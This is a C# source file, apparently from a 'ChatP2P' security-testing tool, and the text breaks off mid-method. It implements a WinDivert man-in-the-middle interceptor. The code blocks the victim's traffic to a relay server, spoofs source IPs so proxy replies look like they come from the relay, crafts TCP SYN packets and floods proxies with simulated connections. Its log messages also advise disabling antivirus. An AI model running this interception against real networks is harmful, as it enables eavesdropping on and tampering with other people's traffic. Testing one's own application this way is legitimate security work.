using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ChatP2P.SecurityTester.Network
{
    /// <summary>
    /// 🕷️ WinDivert interceptor CORRIGÉ pour manipulation de packets en temps réel
    /// Version robuste avec logs détaillés et gestion d'erreurs complète
    /// </summary>
    public class WinDivertInterceptor_Fixed
    {
        private IntPtr _handle = IntPtr.Zero;
        private bool _isRunning = false;
        private CancellationTokenSource? _cancellationToken;
        private readonly string _relayServerIP;
        private readonly string _attackerIP;
        private readonly string _victimIP;
        private int _packetCount = 0;
        private int _interceptedCount = 0;
        private int _modifiedCount = 0;
        private readonly SemaphoreSlim _proxyConnectionSemaphore = new(5, 5); // Max 5 proxy connections concurrentes
        private readonly List<Task> _activeTasks = new(); // Track active tasks pour cleanup
        private bool _multiPortInjectionDone = false; // Pour éviter de re-déclencher plusieurs fois

        public event Action<string>? LogMessage;
        public event Action<string, byte[]>? PacketIntercepted;

        public WinDivertInterceptor_Fixed(string relayServerIP, string attackerIP, string victimIP)
        {
            _relayServerIP = relayServerIP;
            _attackerIP = attackerIP;
            _victimIP = victimIP;
        }

        /// <summary>
        /// 🚀 Démarre l'interception WinDivert pour MITM complet
        /// </summary>
        public async Task<bool> StartInterception()
        {
            try
            {
                LogMessage?.Invoke("🕷️ DÉMARRAGE WINDIVERT INTERCEPTOR:");
                LogMessage?.Invoke($"   🎯 Relay: {_relayServerIP}");
                LogMessage?.Invoke($"   🕷️ Attaquant: {_attackerIP}");
                LogMessage?.Invoke($"   👤 Victime: {_victimIP}");

                // Vérifier que WinDivert.dll existe
                var winDivertPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "WinDivert.dll");
                if (!System.IO.File.Exists(winDivertPath))
                {
                    LogMessage?.Invoke($"❌ WinDivert.dll not found at: {winDivertPath}");
                    LogMessage?.Invoke($"   💡 Solution: Copier WinDivert.dll dans le dossier de l'application");
                    return false;
                }
                LogMessage?.Invoke($"✅ WinDivert.dll found: {winDivertPath}");

                // Vérifier driver
                var driverPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "WinDivert64.sys");
                if (!System.IO.File.Exists(driverPath))
                {
                    LogMessage?.Invoke($"❌ WinDivert64.sys not found at: {driverPath}");
                    LogMessage?.Invoke($"   💡 Solution: Copier WinDivert64.sys dans le dossier de l'application");
                    return false;
                }
                LogMessage?.Invoke($"✅ WinDivert64.sys found: {driverPath}");

                // 🎯 FILTRE REDIRECTION: CAPTURE VM1→PROXY pour redirection + block VM1→Server
                // Capture VM1 to attacker (for proxy redirection) + block VM1 to real server
                string filter = $"((ip.SrcAddr == {_victimIP} and ip.DstAddr == {_relayServerIP}) or " +     // Block VM1→Server
                              $" (ip.SrcAddr == {_victimIP} and ip.DstAddr == {_attackerIP}) or " +          // Capture VM1→Proxy (for redirection)
                              $" (ip.SrcAddr == {_attackerIP} and ip.DstAddr == {_relayServerIP}) or " +      // Capture Proxy→Server
                              $" (ip.SrcAddr == {_attackerIP} and ip.DstAddr == {_victimIP}))";              // Capture Proxy→VM1

                // Plus de restriction de ports - on capture TOUT le TCP victim→relay

                LogMessage?.Invoke($"🔧 WinDivert Tripartite Filter (PACKET REDIRECTION):");
                LogMessage?.Invoke($"   📤 Direction 1: {_victimIP} → {_relayServerIP} => {_attackerIP} (redirect to proxy)");
                LogMessage?.Invoke($"   📥 Direction 2: {_attackerIP} → {_relayServerIP} => {_victimIP} (relay responses)");
                LogMessage?.Invoke($"   📥 Direction 3: {_attackerIP} → {_victimIP} => spoofed as {_relayServerIP} → {_victimIP} (proxy responses)");
                LogMessage?.Invoke($"   🚫 Block: ICMP Redirects (Type 5)");
                LogMessage?.Invoke($"   Filter: {filter}");

                // Ouvrir handle WinDivert avec NETWORK_FORWARD + approche bidirectionnelle MODIFY+REINJECT
                LogMessage?.Invoke($"🔧 Opening WinDivert handle (NETWORK_FORWARD + bidirectional MODIFY+REINJECT)...");
                _handle = WinDivertOpen(filter, WinDivertLayer.WINDIVERT_LAYER_NETWORK_FORWARD, 0, 0);

                if (_handle == IntPtr.Zero || _handle == new IntPtr(-1))
                {
                    var error = Marshal.GetLastWin32Error();
                    LogMessage?.Invoke($"❌ WinDivert open failed: Error {error}");

                    // Messages d'erreur détaillés selon le code d'erreur
                    switch (error)
                    {
                        case 5: // ERROR_ACCESS_DENIED
                            LogMessage?.Invoke($"   ❌ ACCESS DENIED - Lancer en tant qu'ADMINISTRATEUR");
                            LogMessage?.Invoke($"   💡 Solution: Clic droit → 'Exécuter en tant qu'administrateur'");
                            break;
                        case 2: // ERROR_FILE_NOT_FOUND
                            LogMessage?.Invoke($"   ❌ Driver not found - Vérifier WinDivert64.sys");
                            LogMessage?.Invoke($"   💡 Solution: Copier WinDivert64.sys dans le même dossier");
                            break;
                        case 87: // ERROR_INVALID_PARAMETER
                            LogMessage?.Invoke($"   ❌ Invalid filter - Vérifier syntaxe: {filter}");
                            LogMessage?.Invoke($"   💡 Solution: Vérifier IP {_relayServerIP} est valide");
                            break;
                        case 1275: // ERROR_DRIVER_BLOCKED
                            LogMessage?.Invoke($"   ❌ Driver blocked - Antivirus ou Windows Defender");
                            LogMessage?.Invoke($"   💡 Solution: Désactiver antivirus temporairement");
                            break;
                        default:
                            LogMessage?.Invoke($"   ❌ Unknown error {error} - Vérifier installation WinDivert");
                            break;
                    }

                    LogMessage?.Invoke($"   ⚠️ Solutions générales:");
                    LogMessage?.Invoke($"     1. Lancer en tant qu'administrateur");
                    LogMessage?.Invoke($"     2. Vérifier WinDivert.dll et .sys dans le même dossier");
                    LogMessage?.Invoke($"     3. Désactiver antivirus temporairement");
                    LogMessage?.Invoke($"     4. Redémarrer et réessayer");
                    return false;
                }

                LogMessage?.Invoke("✅ WinDivert handle ouvert avec succès");
                LogMessage?.Invoke($"   Handle: 0x{_handle.ToInt64():X}");

                _isRunning = true;
                _cancellationToken = new CancellationTokenSource();

                // Démarrer boucle d'interception
                LogMessage?.Invoke("🔄 Démarrage boucle d'interception...");
                _ = Task.Run(async () => await InterceptionLoop(_cancellationToken.Token));

                LogMessage?.Invoke("🕷️ WinDivert MITM actif - Approche bidirectionnelle MODIFY+REINJECT");
                LogMessage?.Invoke($"📡 Redirection bidirectionnelle: {_victimIP}↔{_relayServerIP}↔{_attackerIP}");
                LogMessage?.Invoke($"🎯 En attente de packets TCP bidirectionnels...");

                return true;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Exception WinDivert: {ex.Message}");
                LogMessage?.Invoke($"   Stack trace: {ex.StackTrace}");
                return false;
            }
        }

        /// <summary>
        /// 🔄 Boucle principale d'interception packets
        /// </summary>
        private async Task InterceptionLoop(CancellationToken cancellationToken)
        {
            try
            {
                var buffer = new byte[65535];
                var addr = new WinDivertAddress();

                LogMessage?.Invoke("🔄 WinDivert interception loop started...");
                LogMessage?.Invoke($"   Buffer size: {buffer.Length} bytes");

                while (_isRunning && !cancellationToken.IsCancellationRequested)
                {
                    try
                    {
                        // Recevoir packet intercepté
                        uint packetLen = 0;
                        LogMessage?.Invoke("⏳ Waiting for packets...");

                        bool success = WinDivertRecv(_handle, buffer, (uint)buffer.Length, ref packetLen, ref addr);

                        if (!success)
                        {
                            var error = Marshal.GetLastWin32Error();
                            if (error == 6) // Handle closed - normal shutdown
                            {
                                LogMessage?.Invoke($"🔄 WinDivert handle closed - stopping loop");
                                break;
                            }
                            else if (error == 995) // Operation aborted - normal on cancellation
                            {
                                LogMessage?.Invoke($"🔄 Operation cancelled - stopping loop");
                                break;
                            }
                            else
                            {
                                LogMessage?.Invoke($"⚠️ WinDivertRecv error: {error}");
                                LogMessage?.Invoke($"   Error description: {GetErrorDescription(error)}");
                                continue;
                            }
                        }

                        if (packetLen == 0)
                        {
                            LogMessage?.Invoke("⚠️ Received empty packet, continuing...");
                            continue;
                        }

                        _packetCount++;
                        LogMessage?.Invoke($"📦 PACKET #{_packetCount} INTERCEPTÉ: {packetLen} bytes");

                        // Analyser et modifier packet
                        var modifiedPacket = await ProcessInterceptedPacket(buffer, (int)packetLen, addr);

                        // Renvoyer packet (modifié ou original) ou DROP si null
                        if (modifiedPacket != null)
                        {
                            uint sentLen = 0;
                            bool sendSuccess = WinDivertSend(_handle, modifiedPacket, (uint)modifiedPacket.Length, ref sentLen, ref addr);

                            if (sendSuccess)
                            {
                                LogMessage?.Invoke($"📤 PACKET SENT: {sentLen} bytes");
                            }
                            else
                            {
                                var sendError = Marshal.GetLastWin32Error();
                                LogMessage?.Invoke($"❌ WinDivertSend failed: Error {sendError}");
                                LogMessage?.Invoke($"   Error description: {GetErrorDescription(sendError)}");
                            }
                        }
                        else
                        {
                            LogMessage?.Invoke($"🗑️ PACKET DROPPED (ICMP Redirect blocked)");
                        }
                    }
                    catch (Exception ex)
                    {
                        LogMessage?.Invoke($"❌ Erreur interception packet: {ex.Message}");
                        LogMessage?.Invoke($"   Exception: {ex.GetType().Name}");
                    }

                    // Petite pause pour éviter 100% CPU
                    await Task.Delay(1, cancellationToken);
                }

                LogMessage?.Invoke("🔄 Interception loop ended");
            }
            catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
            {
                LogMessage?.Invoke($"❌ Erreur boucle interception: {ex.Message}");
                LogMessage?.Invoke($"   Stack trace: {ex.StackTrace}");
            }
        }

        /// <summary>
        /// 🎯 Traite et modifie les packets interceptés - APPROCHE BIDIRECTIONNELLE
        /// </summary>
        private async Task<byte[]?> ProcessInterceptedPacket(byte[] packet, int length, WinDivertAddress addr)
        {
            try
            {
                // Parse IP header pour obtenir destination
                if (length < 20)
                {
                    LogMessage?.Invoke($"⚠️ Packet too small for IP header: {length} bytes");
                    return packet;
                }

                // IP destination offset 16-19
                byte[] destIP = new byte[4];
                Array.Copy(packet, 16, destIP, 0, 4);
                var destination = new IPAddress(destIP).ToString();

                // IP source offset 12-15
                byte[] srcIP = new byte[4];
                Array.Copy(packet, 12, srcIP, 0, 4);
                var source = new IPAddress(srcIP).ToString();

                // Protocol
                var protocol = packet[9];

                LogMessage?.Invoke($"🔍 Packet analysis:");
                LogMessage?.Invoke($"   Source: {source} → Destination: {destination}");
                LogMessage?.Invoke($"   Protocol: {protocol} ({GetProtocolName(protocol)})");
                LogMessage?.Invoke($"   Length: {length} bytes");
                LogMessage?.Invoke($"   Direction: {(addr.Direction == 0 ? "OUTBOUND" : "INBOUND")}");

                // 🚫 BLOCK ICMP Redirects (interfèrent avec injection)
                if (protocol == 1) // ICMP
                {
                    if (length >= 28 && packet[20] == 5) // ICMP Type 5 = Redirect
                    {
                        LogMessage?.Invoke($"🚫 ICMP REDIRECT BLOCKED! Source: {source}");
                        _interceptedCount++;
                        return null; // DROP ICMP Redirect
                    }
                }

                // 🚫 BLOCAGE VM1→SERVEUR (mais autoriser VM1→Proxy TCP)
                if (source == _victimIP && destination == _relayServerIP)
                {
                    LogMessage?.Invoke($"🚫 VM1→SERVER BLOCKED: {source} → {destination} DROPPED! (Protocol: {GetProtocolName(protocol)})");
                    LogMessage?.Invoke($"🎯 VM1 FORCED to use proxy {_attackerIP} - direct server access denied");
                    return null; // 🚫 DROP SEULEMENT VM1→Server
                }

                // ✅ LAISSER PASSER: VM1→Proxy TCP (pour que les proxies TCP reçoivent les connexions)
                if (source == _victimIP && destination == _attackerIP)
                {
                    LogMessage?.Invoke($"✅ VM1→PROXY: Allowing {source} → {destination} (VM1 connecting to TCP proxy)");
                    return packet; // ✅ LAISSER PASSER - VM1 peut se connecter aux proxies TCP
                }

                // 🎯 PROXY REDIRECTION (seulement pour attaquant, VM1 déjà bloqué)
                if (protocol == 6) // TCP only
                {
                    // Parse TCP header pour obtenir les ports
                    if (length < 40) return packet; // IP + TCP minimum

                    int ipHeaderLen = (packet[0] & 0x0F) * 4;
                    if (length < ipHeaderLen + 20) return packet; // TCP header minimum

                    int srcPort = (packet[ipHeaderLen] << 8) | packet[ipHeaderLen + 1];
                    int destPort = (packet[ipHeaderLen + 2] << 8) | packet[ipHeaderLen + 3];

                    LogMessage?.Invoke($"   TCP: {source}:{srcPort} → {destination}:{destPort}");

                    // 📥 LAISSER PASSER: Proxy→Server (pour que les proxies TCP fonctionnent)
                    if (source == _attackerIP && destination == _relayServerIP)
                    {
                        LogMessage?.Invoke($"✅ PROXY→SERVER: Allowing {_attackerIP}:{srcPort} → {_relayServerIP}:{destPort} (proxy traffic)");
                        return packet; // ✅ LAISSER PASSER - pas de modification
                    }
                    // 📥 LAISSER PASSER: Server→Proxy (réponses serveur)
                    else if (source == _relayServerIP && destination == _attackerIP)
                    {
                        LogMessage?.Invoke($"✅ SERVER→PROXY: Allowing {_relayServerIP}:{srcPort} → {_attackerIP}:{destPort} (server response)");
                        return packet; // ✅ LAISSER PASSER - pas de modification
                    }
                    // 📥 LAISSER PASSER: Proxy→VM1 (réponses proxy vers VM1)
                    else if (source == _attackerIP && destination == _victimIP)
                    {
                        LogMessage?.Invoke($"✅ PROXY→VM1: Allowing {_attackerIP}:{srcPort} → {_victimIP}:{destPort} (proxy response to VM1)");
                        return packet; // ✅ LAISSER PASSER - pas de modification
                    }
                }

                // Laisser passer les autres packets
                return packet;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur traitement packet: {ex.Message}");
                LogMessage?.Invoke($"   Stack trace: {ex.StackTrace}");
                return packet; // Laisser passer en cas d'erreur
            }
        }

        /// <summary>
        /// 📤 DIRECTION 1: Redirige packets Victime → Relay vers Attaquant (MODIFY+REINJECT)
        /// </summary>
        private byte[] RedirectOutboundToProxy(byte[] packet, int length, int srcPort, int destPort, WinDivertAddress addr)
        {
            try
            {
                LogMessage?.Invoke($"📤 REDIRECT OUTBOUND: {_victimIP}:{srcPort} → {_relayServerIP}:{destPort} => {_attackerIP}:{destPort}");

                // Créer copie du packet pour modification
                var redirectedPacket = new byte[length];
                Array.Copy(packet, redirectedPacket, length);

                // Modifier IP destination: Relay → Attaquant
                var attackerBytes = IPAddress.Parse(_attackerIP).GetAddressBytes();
                Array.Copy(attackerBytes, 0, redirectedPacket, 16, 4);

                // Recalculer checksums après modification
                RecalculateAllChecksums(redirectedPacket, length);

                _interceptedCount++;
                _modifiedCount++;

                LogMessage?.Invoke($"✅ OUTBOUND REDIRECT: Packet modifié et renvoyé (#{_modifiedCount})");
                LogMessage?.Invoke($"   Original: {_victimIP} → {_relayServerIP}:{destPort}");
                LogMessage?.Invoke($"   Modified: {_victimIP} → {_attackerIP}:{destPort}");

                return redirectedPacket;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur redirect outbound: {ex.Message}");
                return packet; // Retourner original en cas d'erreur
            }
        }

        /// <summary>
        /// 📥 DIRECTION 2: Redirige packets Attaquant → Relay vers Victime (réponses)
        /// </summary>
        private byte[] RedirectProxyResponseToVictim(byte[] packet, int length, int srcPort, int destPort, WinDivertAddress addr)
        {
            try
            {
                LogMessage?.Invoke($"📥 REDIRECT PROXY RESPONSE: {_attackerIP}:{srcPort} → {_victimIP}:{destPort} => {_relayServerIP}:{srcPort} → {_victimIP}:{destPort}");

                // Créer copie du packet pour modification
                var redirectedPacket = new byte[length];
                Array.Copy(packet, redirectedPacket, length);

                // Modifier IP source: Proxy → Relay (pour apparaître comme réponse du relay)
                var relayBytes = IPAddress.Parse(_relayServerIP).GetAddressBytes();
                Array.Copy(relayBytes, 0, redirectedPacket, 12, 4);

                // Destination IP reste la victime (pas de changement nécessaire)

                // Recalculer checksums après modification
                RecalculateAllChecksums(redirectedPacket, length);

                _interceptedCount++;
                _modifiedCount++;

                LogMessage?.Invoke($"✅ PROXY RESPONSE REDIRECT: Packet modifié et renvoyé (#{_modifiedCount})");
                LogMessage?.Invoke($"   Original: {_attackerIP}:{srcPort} → {_victimIP}:{destPort}");
                LogMessage?.Invoke($"   Modified: {_relayServerIP}:{srcPort} → {_victimIP}:{destPort}");

                return redirectedPacket;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur redirect proxy response: {ex.Message}");
                return packet; // Retourner original en cas d'erreur
            }
        }

        private byte[] RedirectToProxy(byte[] packet, int length, int destPort, WinDivertAddress addr)
        {
            try
            {
                LogMessage?.Invoke($"📤 REDIRECT TO PROXY: {_victimIP} → {_relayServerIP}:{destPort} => {_attackerIP}:{destPort}");

                // Créer copie du packet pour modification
                var redirectedPacket = new byte[length];
                Array.Copy(packet, redirectedPacket, length);

                // Modifier IP destination: Relay → Proxy (pour rediriger vers proxy)
                var proxyBytes = IPAddress.Parse(_attackerIP).GetAddressBytes();
                Array.Copy(proxyBytes, 0, redirectedPacket, 16, 4);

                // Source IP reste la victime (pas de changement nécessaire)

                // Recalculer checksums après modification
                RecalculateAllChecksums(redirectedPacket, length);

                _interceptedCount++;
                _modifiedCount++;

                LogMessage?.Invoke($"✅ TO PROXY REDIRECT: Packet modifié et renvoyé (#{_modifiedCount})");
                LogMessage?.Invoke($"   Original: {_victimIP} → {_relayServerIP}:{destPort}");
                LogMessage?.Invoke($"   Modified: {_victimIP} → {_attackerIP}:{destPort}");

                return redirectedPacket;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur redirect to proxy: {ex.Message}");
                return packet; // Retourner original en cas d'erreur
            }
        }

        private byte[] RedirectInboundFromProxy(byte[] packet, int length, int srcPort, int destPort, WinDivertAddress addr)
        {
            try
            {
                LogMessage?.Invoke($"📥 REDIRECT INBOUND: {_attackerIP}:{srcPort} → {_relayServerIP}:{destPort} => {_victimIP}:{destPort}");

                // Créer copie du packet pour modification
                var redirectedPacket = new byte[length];
                Array.Copy(packet, redirectedPacket, length);

                // Modifier IP destination: Relay → Victime (pour les réponses)
                var victimBytes = IPAddress.Parse(_victimIP).GetAddressBytes();
                Array.Copy(victimBytes, 0, redirectedPacket, 16, 4);

                // Modifier IP source: Attaquant → Relay (pour apparaître comme réponse du relay)
                var relayBytes = IPAddress.Parse(_relayServerIP).GetAddressBytes();
                Array.Copy(relayBytes, 0, redirectedPacket, 12, 4);

                // Recalculer checksums après modification
                RecalculateAllChecksums(redirectedPacket, length);

                _interceptedCount++;
                _modifiedCount++;

                LogMessage?.Invoke($"✅ INBOUND REDIRECT: Packet modifié et renvoyé (#{_modifiedCount})");
                LogMessage?.Invoke($"   Original: {_attackerIP} → {_relayServerIP}:{destPort}");
                LogMessage?.Invoke($"   Modified: {_relayServerIP} → {_victimIP}:{destPort}");

                return redirectedPacket;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur redirect inbound: {ex.Message}");
                return packet; // Retourner original en cas d'erreur
            }
        }

        /// <summary>
        /// 🔧 Recalcule tous les checksums après modification (basé sur webfilter.c)
        /// </summary>
        private void RecalculateAllChecksums(byte[] packet, int length)
        {
            try
            {
                // Vérifier que c'est un packet IP valide
                if (length < 20)
                {
                    LogMessage?.Invoke($"⚠️ Packet trop petit pour IP header: {length} bytes");
                    return;
                }

                // Parse IP header length (IHL field)
                var ihl = (packet[0] & 0x0F) * 4; // Internet Header Length en bytes
                LogMessage?.Invoke($"🔧 IP Header Length: {ihl} bytes");

                // Reset IP checksum
                packet[10] = 0;
                packet[11] = 0;

                // Calculer nouveau IP checksum (header variable length)
                uint sum = 0;
                for (int i = 0; i < ihl; i += 2)
                {
                    if (i + 1 < ihl)
                        sum += (uint)((packet[i] << 8) + packet[i + 1]);
                    else
                        sum += (uint)(packet[i] << 8); // Cas impair
                }

                // Fold carry bits
                while ((sum >> 16) != 0)
                {
                    sum = (sum & 0xFFFF) + (sum >> 16);
                }
                sum = ~sum;

                packet[10] = (byte)(sum >> 8);
                packet[11] = (byte)(sum & 0xFF);

                LogMessage?.Invoke($"✅ IP checksum recalculé: 0x{packet[10]:X2}{packet[11]:X2}");

                // TCP checksum (si TCP packet)
                var protocol = packet[9];
                if (protocol == 6 && length >= ihl + 20) // TCP
                {
                    RecalculateTCPChecksum(packet, length, ihl);
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur recalcul checksums: {ex.Message}");
            }
        }


        /// <summary>
        /// 🔗 Déclenche connexion proxy hybride avec limitation concurrence (DÉSACTIVÉ)
        /// </summary>
        private async Task TriggerProxyConnectionForPortWithSemaphore(int destPort, int srcPort)
        {
            // 🚫 DÉSACTIVÉ pour éviter crash - les proxies TCP normaux suffisent
            LogMessage?.Invoke($"🚫 INTERNAL PROXY DISABLED: Port {destPort} - Using external TCP proxies only");
            await Task.Delay(100); // Évite avertissement async
            return;
        }

        /// <summary>
        /// 📦 Crée un packet TCP SYN pour simulation de connexion serveur → victime
        /// </summary>
        private byte[]? CreateTCPSynPacket(string srcIP, int srcPort, string dstIP, int dstPort)
        {
            try
            {
                LogMessage?.Invoke($"📦 Creating TCP SYN packet: {srcIP}:{srcPort} → {dstIP}:{dstPort}");

                // Taille: IP header (20) + TCP header (20) = 40 bytes
                var packet = new byte[40];

                // IP Header (20 bytes)
                packet[0] = 0x45;  // Version (4) + IHL (5)
                packet[1] = 0x00;  // DSCP + ECN
                packet[2] = 0x00;  // Total Length MSB
                packet[3] = 0x28;  // Total Length LSB (40 bytes)
                packet[4] = 0x12;  // Identification MSB
                packet[5] = 0x34;  // Identification LSB
                packet[6] = 0x40;  // Flags + Fragment Offset MSB (Don't Fragment)
                packet[7] = 0x00;  // Fragment Offset LSB
                packet[8] = 0x40;  // TTL (64)
                packet[9] = 0x06;  // Protocol (TCP)
                packet[10] = 0x00; // Checksum MSB (calculé plus tard)
                packet[11] = 0x00; // Checksum LSB

                // Source IP
                var srcBytes = System.Net.IPAddress.Parse(srcIP).GetAddressBytes();
                Array.Copy(srcBytes, 0, packet, 12, 4);

                // Destination IP
                var dstBytes = System.Net.IPAddress.Parse(dstIP).GetAddressBytes();
                Array.Copy(dstBytes, 0, packet, 16, 4);

                // TCP Header (20 bytes, offset 20)
                packet[20] = (byte)(srcPort >> 8);  // Source Port MSB
                packet[21] = (byte)(srcPort & 0xFF); // Source Port LSB
                packet[22] = (byte)(dstPort >> 8);  // Destination Port MSB
                packet[23] = (byte)(dstPort & 0xFF); // Destination Port LSB

                // Sequence Number (random)
                var random = new Random();
                var seqNum = (uint)random.Next();
                packet[24] = (byte)(seqNum >> 24);
                packet[25] = (byte)(seqNum >> 16);
                packet[26] = (byte)(seqNum >> 8);
                packet[27] = (byte)(seqNum & 0xFF);

                // Acknowledgment Number (0 for SYN)
                packet[28] = 0x00;
                packet[29] = 0x00;
                packet[30] = 0x00;
                packet[31] = 0x00;

                // Data Offset (5 * 4 = 20 bytes) + Flags
                packet[32] = 0x50; // Data Offset (5) + Reserved (0)
                packet[33] = 0x02; // Flags: SYN
                packet[34] = 0x20; // Window Size MSB (8192)
                packet[35] = 0x00; // Window Size LSB
                packet[36] = 0x00; // Checksum MSB (calculé plus tard)
                packet[37] = 0x00; // Checksum LSB
                packet[38] = 0x00; // Urgent Pointer MSB
                packet[39] = 0x00; // Urgent Pointer LSB

                LogMessage?.Invoke($"✅ TCP SYN packet created: {packet.Length} bytes");
                return packet;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur création TCP SYN packet: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// 🚀 FORCE VM1 CONNECTION: Injecte packets TCP SYN vers VM1 pour forcer connexions réelles aux proxies
        /// </summary>
        private async Task ForceVictimConnectionToProxy(int destPort)
        {
            try
            {
                LogMessage?.Invoke($"🚀 FORCING VICTIM CONNECTION: Generating TCP SYN {_relayServerIP}:{destPort} → {_victimIP}:random");
                LogMessage?.Invoke($"🎯 Objectif: Forcer VM1 à initier vraies connexions TCP vers nos proxies");

                // Générer un port source aléatoire élevé pour le serveur simulé
                var random = new Random();
                var fakeServerPort = random.Next(40000, 65000);

                // Créer packet TCP SYN simulé depuis le serveur vers VM1
                var synPacket = CreateTCPSynPacket(_relayServerIP, fakeServerPort, _victimIP, destPort);

                if (synPacket != null)
                {
                    LogMessage?.Invoke($"📤 INJECTING SYN: {_relayServerIP}:{fakeServerPort} → {_victimIP}:{destPort}");
                    LogMessage?.Invoke($"🎭 VM1 va croire que le serveur veut se connecter et va répondre SYN-ACK");

                    // TODO: Injecter via WinDivert (besoin handle pour injection sortante)
                    LogMessage?.Invoke($"⚠️ SYN injection requires WinDivert OUTBOUND handle - implementing fallback");
                }

                // FALLBACK: Forcer connexion directe depuis attaquant avec spoofed source
                await TriggerDirectConnectionFromVictimIP(destPort);
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur force victim connection: {ex.Message}");
            }
        }

        /// <summary>
        /// 🎭 FALLBACK: Connexion directe avec IP source spoofée comme victime
        /// </summary>
        private async Task TriggerDirectConnectionFromVictimIP(int destPort)
        {
            try
            {
                LogMessage?.Invoke($"🎭 FALLBACK: Direct connection avec source IP spoofée comme victime");
                LogMessage?.Invoke($"🔗 Tentative: {_victimIP} → {_attackerIP}:{destPort} (spoofed source)");

                // Créer connexion avec binding sur l'interface réseau local
                using var client = new System.Net.Sockets.TcpClient();

                // Tenter de bind sur l'IP de la victime (si possible sur même réseau)
                try
                {
                    var localEndpoint = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(_attackerIP), 0);
                    client.Client.Bind(localEndpoint);
                    LogMessage?.Invoke($"🔧 Client bound to attacker IP: {_attackerIP}");
                }
                catch (Exception bindEx)
                {
                    LogMessage?.Invoke($"⚠️ Could not bind to victim IP: {bindEx.Message}");
                }

                client.ReceiveTimeout = 5000;
                client.SendTimeout = 5000;

                // Se connecter au proxy
                await client.ConnectAsync(_attackerIP, destPort);
                LogMessage?.Invoke($"✅ FORCED CONNECTION: Connected to proxy {_attackerIP}:{destPort}");

                // Simuler trafic ChatP2P réaliste
                var stream = client.GetStream();
                var testData = destPort switch
                {
                    7777 => "FRIEND_REQ:VM1:VM2:test_key:Hello from forced connection!",
                    8888 => "MSG:VM1:VM2:Forced message test",
                    8889 => "{\"Command\":\"status\",\"Action\":\"ping\"}",
                    8891 => "FILE_HEADER:forced_test.txt:512",
                    _ => "TEST_CONNECTION"
                };

                await stream.WriteAsync(System.Text.Encoding.UTF8.GetBytes(testData));
                LogMessage?.Invoke($"📤 FORCED DATA SENT: {testData.Length} bytes to port {destPort}");

                // Maintenir connexion brièvement
                await Task.Delay(2000);
                LogMessage?.Invoke($"🔄 FORCED CONNECTION MAINTAINED: VM1 proxy {destPort} should now be active");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur fallback connection: {ex.Message}");
            }
        }

        /// <summary>
        /// 🔥 ULTIMATE APPROACH: Simuler panne réseau du vrai serveur pour forcer VM1 vers proxies
        /// </summary>
        private async Task SimulateServerOutageToForceProxyUsage()
        {
            try
            {
                LogMessage?.Invoke($"🔥 ULTIMATE MITM: Simulating complete server outage for {_relayServerIP}");
                LogMessage?.Invoke($"🎯 VM1 will be FORCED to use our proxies as the only available option");

                // Attendre un délai pour laisser VM1 essayer le vrai serveur
                await Task.Delay(3000);

                // 🎯 NOUVEAU: Générer trafic simulé comme si VM1 se connectait directement à nos proxies
                LogMessage?.Invoke($"🎯 GENERATING VM1-LIKE TRAFFIC: Simulating VM1 connecting directly to our proxies");
                await SimulateVM1DirectConnectionsToProxies();

                // Ensuite, simuler des connexions qui semblent venir de différents clients
                var chatP2PPorts = new[] { 7777, 8888, 8889, 8891 };
                var tasks = new List<Task>();

                foreach (var port in chatP2PPorts)
                {
                    // Simuler 3 tentatives de connexion par port pour saturer
                    for (int attempt = 1; attempt <= 3; attempt++)
                    {
                        var task = Task.Run(async () =>
                        {
                            try
                            {
                                LogMessage?.Invoke($"🔥 OUTAGE SIMULATION: Attempt {attempt} to connect to proxy port {port}");

                                using var client = new System.Net.Sockets.TcpClient();
                                client.ReceiveTimeout = 3000;
                                client.SendTimeout = 3000;

                                await client.ConnectAsync(_attackerIP, port);
                                LogMessage?.Invoke($"✅ OUTAGE SIMULATION: Successfully connected to proxy {_attackerIP}:{port} (attempt {attempt})");

                                var stream = client.GetStream();
                                var simulatedData = port switch
                                {
                                    7777 => $"FRIEND_REQ:ClientSim{attempt}:VM1:simulated_key:Simulated connection attempt {attempt}",
                                    8888 => $"MSG:ClientSim{attempt}:VM1:Simulated message {attempt}",
                                    8889 => $"{{\"Command\":\"simulation\",\"Action\":\"ping\",\"Attempt\":{attempt}}}",
                                    8891 => $"FILE_HEADER:sim{attempt}.txt:256",
                                    _ => $"SIM_CONNECTION_{attempt}"
                                };

                                await stream.WriteAsync(System.Text.Encoding.UTF8.GetBytes(simulatedData));
                                LogMessage?.Invoke($"📤 OUTAGE SIMULATION: Data sent to port {port} attempt {attempt}");

                                // Maintenir connexion active
                                await Task.Delay(5000);
                                LogMessage?.Invoke($"🔄 OUTAGE SIMULATION: Maintaining connection port {port} attempt {attempt}");
                            }
                            catch (Exception ex)
                            {
                                LogMessage?.Invoke($"⚠️ OUTAGE SIMULATION: Connection attempt failed for port {port} attempt {attempt}: {ex.Message}");
                            }
                        });

                        tasks.Add(task);
                    }
                }

                LogMessage?.Invoke($"🚀 OUTAGE SIMULATION: Starting {tasks.Count} concurrent connection attempts to saturate proxies");
                await Task.WhenAll(tasks);
                LogMessage?.Invoke($"✅ OUTAGE SIMULATION: All simulation connections completed - proxies should now be highly active");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur simulation server outage: {ex.Message}");
            }
        }

        /// <summary>
        /// 🎯 SIMULATE VM1 DIRECT: Générer trafic comme si VM1 se connectait directement à nos proxies
        /// </summary>
        private async Task SimulateVM1DirectConnectionsToProxies()
        {
            try
            {
                LogMessage?.Invoke($"🎯 SIMULATING VM1 DIRECT: Creating fake VM1 traffic to our proxies");
